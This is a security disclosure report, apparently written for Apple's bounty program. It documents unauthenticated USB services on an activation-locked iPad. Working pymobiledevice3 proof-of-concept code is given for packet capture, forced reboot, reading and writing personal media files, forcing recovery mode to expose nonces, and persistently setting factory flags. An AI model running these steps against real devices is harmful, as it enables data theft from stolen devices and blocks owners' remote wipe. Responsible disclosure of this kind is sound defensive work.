# Sensitive Services Accessible Without Authentication on Activation-Locked iOS Device

## Summary

An activation-locked iOS 26.3 device exposes multiple sensitive services over USB to any connected computer without pairing, passcode, or any form of authentication. The most concerning services are:

- pcapd: Full network packet capture of the device's WiFi traffic, enabling surveillance of all network activity including HTTPS metadata, DNS queries, and potentially authentication tokens in transit.
- diagnostics_relay: Unauthenticated device reboot, shutdown, and sleep commands, enabling denial-of-service against the device owner.
- AFC (Apple File Conduit): Read AND write access to /var/mobile/Media/ including personal photos (DCIM), books, music, downloads databases, and media analysis databases.
- syslog_relay: Live system log streaming revealing running processes, service states, network activity, and Setup Assistant behavior.
- crashreportcopymobile: Full access to crash reports which may contain sensitive application data and memory dumps.
- enter_recovery(): Ability to force the device into recovery mode, exposing device nonces (APNonce, SEPNonce, ECID) used for firmware signing.

Additionally, the lockdownd service accepts and persistently stores arbitrary key-value pairs on the locked device, including Apple-internal factory flags (allow-hactivation, DisableHactivation) that persist across reboots.

## Severity

Medium-High -- Unauthorized network surveillance, device control, file system access, and persistent configuration modification on a locked device.

## Affected Component

Multiple lockdownd-managed services on activation-locked devices:
- com.apple.pcapd
- com.apple.mobile.diagnostics_relay
- com.apple.afc
- com.apple.syslog_relay
- com.apple.crashreportcopymobile
- com.apple.mobile.notification_proxy
- com.apple.mobile.heartbeat
- com.apple.mobile.mobile_image_mounter
- com.apple.os_trace_relay
- com.apple.mobileactivationd
- com.apple.lockdownd (set_value without validation)

## Affected Versions

Confirmed on iPadOS 26.3 on iPad8,10 (iPad Pro 11-inch 2nd gen, A12Z). Likely affects all iOS/iPadOS versions on all device models in the activation-locked state.

## Reproduction Steps

### Prerequisites

- macOS or Linux computer
- USB-A to USB-C (or USB-C to USB-C) cable
- Activation-locked iOS device (on the Setup Assistant / activation lock screen)
- Python 3.12 with pymobiledevice3: pip install pymobiledevice3

### Issue 1: Network Packet Capture on Locked Device (pcapd)

An attacker can capture all network traffic from the device's WiFi interface over USB without any authentication.

```python
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux

async def main():
    lockdown = await create_using_usbmux()
    # pcapd service starts without authentication
    svc = await lockdown.start_lockdown_service('com.apple.pcapd')
    print("pcapd service started -- capturing network traffic")
    # All WiFi packets are now available via this service

asyncio.run(main())
```

Or using the pymobiledevice3 CLI:

```bash
python3 -m pymobiledevice3 pcap --out captured_traffic.pcap --count 1000
```

Expected behavior: pcapd should require device pairing or authentication before exposing network traffic.

Actual behavior: pcapd starts immediately on a locked, unpaired device. All WiFi network packets are captured.

### Issue 2: Unauthenticated Device Reboot/Shutdown (diagnostics_relay)

An attacker can reboot, shut down, or sleep the device remotely over USB.

```python
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.diagnostics import DiagnosticsService

async def main():
    lockdown = await create_using_usbmux()
    diag = DiagnosticsService(lockdown)

    # Any of these work without authentication:
    await diag.restart()   # Forces reboot
    # await diag.shutdown()  # Forces shutdown
    # await diag.sleep()     # Forces sleep

asyncio.run(main())
```

Expected behavior: Device control commands should require pairing or passcode authentication.

Actual behavior: All three commands execute immediately without any authentication.

### Issue 3: File System Write Access (AFC)

An attacker can read personal files and write arbitrary data to the device's media partition.

```python
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService

async def main():
    lockdown = await create_using_usbmux()
    afc = AfcService(lockdown)

    # Read personal photos directory
    dcim = await afc.listdir('/DCIM')
    print(f"Photos: {dcim}")

    # Read downloads database
    db = await afc.get_file_contents('/Downloads/downloads.28.sqlitedb')
    print(f"Downloads DB: {len(db)} bytes")

    # Read books metadata
    books = await afc.get_file_contents(
        '/Books/MetadataStore/BookMetadataStore.sqlite')
    print(f"Books DB: {len(books)} bytes")

    # WRITE arbitrary files to the device
    await afc.set_file_contents('/test_write.txt', b'written without auth')
    content = await afc.get_file_contents('/test_write.txt')
    assert content == b'written without auth'
    await afc.rm('/test_write.txt')

    # Writable directories confirmed:
    for path in ['/Books/Purchases', '/Music', '/PhotoData',
                 '/DCIM', '/iTunes_Control/iTunes', '/Downloads']:
        await afc.set_file_contents(f'{path}/_test', b'x')
        await afc.rm(f'{path}/_test')
        print(f"  {path}: WRITABLE")

asyncio.run(main())
```

Expected behavior: An activation-locked device should not allow file system writes over USB. Read access to personal media should require authentication.

Actual behavior: Full read/write access to /var/mobile/Media/ and all subdirectories. Personal photos, books, music databases, and media analysis data are readable. Arbitrary files can be written.

### Issue 4: Forced Recovery Mode with Nonce Exposure

An attacker can force the device into recovery mode, which exposes the device's APNonce and SEPNonce.

```python
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux

async def main():
    lockdown = await create_using_usbmux()
    await lockdown.enter_recovery()

asyncio.run(main())
```

Once in recovery mode, the device nonces are readable via irecovery:

```bash
$ irecovery -q
CPID: 0x8027
ECID: REDACTED-ECID
NONC: 778811943b98783af5152eca53e1953e5be528f69a73c645f19c1347d6d45885
SNON: 144dd9b8aa16736234922633ae9c48f4b53127cd
SRNM: DMPC20KDPV13
```

Expected behavior: Entering recovery mode and exposing device nonces should require authentication or device pairing.

Actual behavior: Recovery mode entry is immediate. APNonce and SEPNonce are exposed, which can be used for SHSH blob saving (relevant to firmware downgrade attacks).

### Issue 5: Persistent Factory Flag Modification (lockdownd)

An attacker can set and persistently store Apple-internal factory flags on the locked device.

```python
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux

async def main():
    lockdown = await create_using_usbmux()

    # Set Apple-internal hactivation flags
    await lockdown.set_value(True, key='allow-hactivation')
    await lockdown.set_value(True, key='DisableHactivation')

    print("Flags set")

asyncio.run(main())
```

After rebooting the device (via diagnostics_relay), the flags persist:

```python
async def verify():
    lockdown = await create_using_usbmux()
    val1 = await lockdown.get_value(key='allow-hactivation')
    val2 = await lockdown.get_value(key='DisableHactivation')
    print(f"allow-hactivation: {val1}")      # True
    print(f"DisableHactivation: {val2}")      # True
```

These flags are referenced in Apple's own restored_external binary (on the restore ramdisk) where they control whether hacktivation checks are enforced during DFU restore flows.

Expected behavior: lockdownd should reject setting internal factory/debug flags on a consumer device, especially without authentication.

Actual behavior: Arbitrary key-value pairs, including security-relevant factory flags, are accepted and persist across reboots.

### Issue 6: System Log Streaming (syslog_relay)

Live system logs are streamable over USB, revealing Setup Assistant behavior, WiFi connection state, running services, and internal process communications.

```python
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.syslog import SyslogService

async def main():
    lockdown = await create_using_usbmux()
    syslog = SyslogService(lockdown)
    async for line in syslog.watch():
        print(line)  # Live system logs

asyncio.run(main())
```

Observed log entries include WiFi SSID probes, Setup Assistant (PurpleBuddy) state transitions, notification dispatch, and service activation/deactivation events.

## Complete Service Enumeration

Tested on iPad8,10, iPadOS 26.3, activation-locked:

| Service | Status | Security Concern |
|---------|--------|-----------------|
| com.apple.mobileactivationd | Available | Expected (activation flow) |
| com.apple.afc | Available | Read/write to personal media |
| com.apple.mobile.diagnostics_relay | Available | Unauthenticated reboot/shutdown |
| com.apple.mobile.notification_proxy | Available | Send/receive notifications |
| com.apple.mobile.heartbeat | Available | Low concern |
| com.apple.crashreportcopymobile | Available | Crash logs with sensitive data |
| com.apple.mobile.mobile_image_mounter | Available | Disk image mounting |
| com.apple.syslog_relay | Available | Live system log exposure |
| com.apple.pcapd | Available | Network traffic surveillance |
| com.apple.os_trace_relay | Available | OS trace logs |
| com.apple.afc2 | Rejected | Correctly blocked |
| com.apple.webinspector | Rejected | Correctly blocked |
| com.apple.mobile.MCInstall | Rejected | Correctly blocked |
| com.apple.mobile.installation_proxy | Rejected | Correctly blocked |

## Security Impact

1. Network surveillance. pcapd on a locked device allows capturing all WiFi traffic. An attacker who briefly connects to a stolen device can exfiltrate network metadata, DNS queries, and potentially intercept authentication flows when the device reconnects to known networks.

2. Denial of service. diagnostics_relay allows repeatedly rebooting or shutting down the device, preventing the owner from using Find My or remotely wiping it.

3. Data exfiltration. AFC read access exposes photos, media databases, books metadata, and download histories without any authentication.

4. File planting. AFC write access allows placing crafted files (databases, plists, media) that system daemons (bookassetd, itunesstored, mobileassetd) may process when the device is eventually unlocked, creating a persistent attack surface.

5. Nonce harvesting. Forced recovery mode exposes APNonce and SEPNonce, enabling SHSH blob saving that can be used in future firmware downgrade attacks if combined with other vulnerabilities.

6. Factory flag injection. Persistent hactivation flags could become exploitable if a future vulnerability allows triggering the restore daemon's code path on the running system.

## Suggested Remediation

1. Require pairing for pcapd, syslog_relay, and diagnostics_relay. These services expose sensitive device data and control capabilities that should never be available without authentication, regardless of device state.

2. Restrict AFC to read-only on activation-locked devices, or disable it entirely. The activation flow does not require file system write access from the host computer.

3. Disable enter_recovery() on unpaired devices. Recovery mode entry should require either device pairing or physical button combination (which requires physical possession).

4. Validate lockdownd set_value keys. Maintain an allowlist of keys that can be set on locked/unpaired devices. Reject all others, especially keys containing "hactivation", "factory", "test", or "debug".

5. Rate-limit or disable diagnostics_relay restart/shutdown on locked devices to prevent denial-of-service against the device owner's remote management capabilities.

## Test Environment

- Device: iPad Pro 11-inch (2nd gen, Cellular) -- iPad8,10
- iPadOS: 26.3
- UDID: REDACTED-UDID
- Chip: A12Z Bionic (CPID: 0x8027)
- Device state: Activation-locked (Setup Assistant visible)
- Tool: pymobiledevice3 v9.8.2 on macOS 13.6

## Timeline

- 2026-04-05: Services enumerated and tested during security research
- 2026-04-05: Findings verified across multiple device reboots
- 2026-04-05: Report prepared for Apple Security Bounty
